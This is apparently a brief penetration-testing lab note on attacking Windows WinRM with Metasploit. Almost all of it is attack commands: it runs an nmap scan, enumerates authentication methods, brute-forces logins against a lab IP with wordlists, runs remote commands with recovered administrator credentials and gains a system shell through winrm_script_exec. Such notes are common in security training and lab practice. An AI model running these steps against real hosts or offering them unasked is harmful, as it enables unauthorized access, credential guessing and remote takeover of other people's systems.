# Exploiting Windows WinRM

- WinRM is a Windows protocol that is used to remotely access Windows systems
- also used to manage and configure windows systems remotely
- Runs on TCP port 5985 and 5986 (HTTPS)

#### INITIAL ENUMERATION:

```
db_namp -sV -O -p- 10.5.24.36
```

#### ENUMERATING AUTHENTICATION METHODS:

```
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS 10.5.24.36
exploit
```

#### BRUTEFORCING WINRM LOGIN CREDS:

```
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 10.5.24.36
set USER_FILE /usr/share/wordlists/metasploit/common_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set VERBOSE false
exploit
```

#### RUNNING REMOTE COMMANDS:

```
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS 10.5.24.36
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit
```

#### GAINING SYSTEM SHELL:

```
use exploit/windows/winrm/winrm_script_exec
set RHOSTS 10.5.24.36
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit
```